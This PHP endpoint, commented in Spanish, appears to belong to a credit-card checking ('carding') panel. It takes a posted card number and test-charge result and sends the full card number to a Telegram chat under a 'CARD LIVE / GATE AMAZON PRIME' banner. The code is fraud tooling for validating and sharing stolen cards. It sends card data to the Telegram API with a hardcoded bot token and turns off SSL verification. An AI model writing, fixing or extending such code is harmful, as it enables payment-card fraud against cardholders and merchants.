<?php
header('Content-Type: application/json');
session_start();

// Verificar si el usuario está logueado
if (!isset($_SESSION['user_id'])) {
    die(json_encode(['error' => 'No autorizado']));
}

require_once $_SERVER["DOCUMENT_ROOT"] . "/api/v1.1/core/brain.php";

// Obtener el ID de Telegram del usuario
$user_id = $_SESSION['user_id'];
$stmt = $connection->prepare("SELECT telegram_chat_id FROM breathe_users WHERE id = :user_id");
$stmt->bindParam(':user_id', $user_id, PDO::PARAM_INT);
$stmt->execute();
$telegram_data = $stmt->fetch(PDO::FETCH_ASSOC);
$telegram_chat_id = $telegram_data['telegram_chat_id'] ?? null;

if (!$telegram_chat_id) {
    die(json_encode(['error' => 'ID de Telegram no configurado']));
}

// Obtener los datos del POST
$data = json_decode(file_get_contents('php://input'), true);
$card = $data['card'] ?? null;
$gate = $data['gate'] ?? null;
$pais = $data['pais'] ?? null;
$response = $data['response'] ?? null;

if (!$card || !$gate || !$pais || !$response) {
    die(json_encode(['error' => 'Datos incompletos']));
}

// Token del bot de Telegram
$bot_token = '7617080823:8237057073:AAHUR5G7fXTzTM6YKzEF9gbQbvZ6jS7TXBk';

// Limpiar la respuesta de HTML
$response = strip_tags($response);

// Preparar el mensaje con la plantilla exacta
$text = "✅ 𝐸𝑁 𝑉𝐼𝑉𝑂 𝐶𝐴𝑅𝐷 𝐿𝐼𝑉𝐸✅\n\n";
$text .= "💳 𝙲𝙰𝚁𝙳 𝙲𝙲:: $card\n\n";
$text .= "⚙️ 𝙶𝙰𝚃𝙴 :: 𝘼𝙈𝘼𝙕𝙊𝙉 𝙋𝙍𝙄𝙈𝙀 \n\n";
$text .= "💲𝙲𝙾𝙱𝚁𝙾 :: 20 𝙈𝙓\n\n";
$text .= "🗾 𝙿𝙰𝙸𝚂 ™ :: 𝙈𝙓\n\n";
$text .= "⚙️ 𝚁𝙴𝚂𝙿𝚄𝙴𝚂𝚃𝙰 :: 𝙇𝙄𝙑𝙀 𝙑𝙄𝙑𝘼 ✅\n\n";
$text .= "⏲️ 𝙏𝙄𝙈𝙀 :: " . date('Y-m-d H/i/s');

// Enviar mensaje a Telegram
$url = "https://api.telegram.org/bot{$bot_token}/sendMessage";
$params = [
    'chat_id' => $telegram_chat_id,
    'text' => $text,
    'parse_mode' => 'HTML'
];

$ch = curl_init($url);
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, $params);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
curl_setopt($ch, CURLOPT_TIMEOUT, 10);

$result = curl_exec($ch);
$http_code = curl_getinfo($ch, CURLINFO_HTTP_CODE);

if (curl_errno($ch)) {
    die(json_encode([
        'error' => 'Error de cURL: ' . curl_error($ch),
        'http_code' => $http_code
    ]));
}

curl_close($ch);

// Decodificar la respuesta de Telegram
$response = json_decode($result, true);

// Verificar si el mensaje se envió correctamente
if ($response['ok']) {
    echo json_encode(['ok' => true, 'message' => 'Mensaje enviado correctamente']);
} else {
    echo json_encode([
        'error' => 'Error al enviar mensaje',
        'telegram_error' => $response['description'] ?? 'Error desconocido',
        'http_code' => $http_code
    ]);
} 